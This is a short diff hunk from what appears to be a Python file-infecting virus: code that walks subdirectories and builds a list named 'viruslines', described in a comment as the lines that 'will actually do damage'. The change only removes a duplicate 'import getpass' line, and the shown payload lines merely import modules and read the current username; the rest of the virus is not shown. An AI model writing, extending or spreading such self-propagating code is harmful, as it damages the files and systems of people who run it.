@@ -29,7 +29,6 @@ for d in subdirs:
 			
 			# defines all of the lines of code that will actually do damage
 			viruslines = ["import getpass\n"]
-			viruslines.append("import getpass\n")
 			viruslines.append("import os\n")
 			viruslines.append("\n")
 			viruslines.append("username = getpass.getuser()\n")
